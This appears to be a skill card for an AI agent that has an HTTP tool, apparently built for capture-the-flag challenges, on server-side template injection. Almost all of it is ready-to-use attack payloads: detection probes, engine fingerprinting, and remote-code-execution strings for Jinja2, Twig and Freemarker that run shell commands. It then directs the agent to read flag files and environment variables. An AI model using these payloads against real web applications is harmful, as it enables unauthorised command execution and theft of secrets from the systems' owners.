---
name: ssti
when: input is reflected through a template engine (Jinja2, Twig, Freemarker, Velocity, ERB)
tools: [http_request]
phase: exploit
---
# Server-side template injection

Detect: submit `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`; a `49` in the response = injection.
Fingerprint with `{{7*'7'}}` (Jinja2 -> 7777777, Twig -> 49).
RCE payloads:
- Jinja2 (Python/Flask):
  `{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}`
  or `{{ ''.__class__.__mro__[1].__subclasses__() }}` then find Popen/`os` and call it;
  `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`.
- Twig (PHP): `{{ ['id']|filter('system') }}` or `{{ _self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`.
- Freemarker (Java): `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- Velocity/Java: use the `$class.inspect(...)` reflective chain.
Read the flag directly (`cat /flag*`, `env`) once you have command exec.
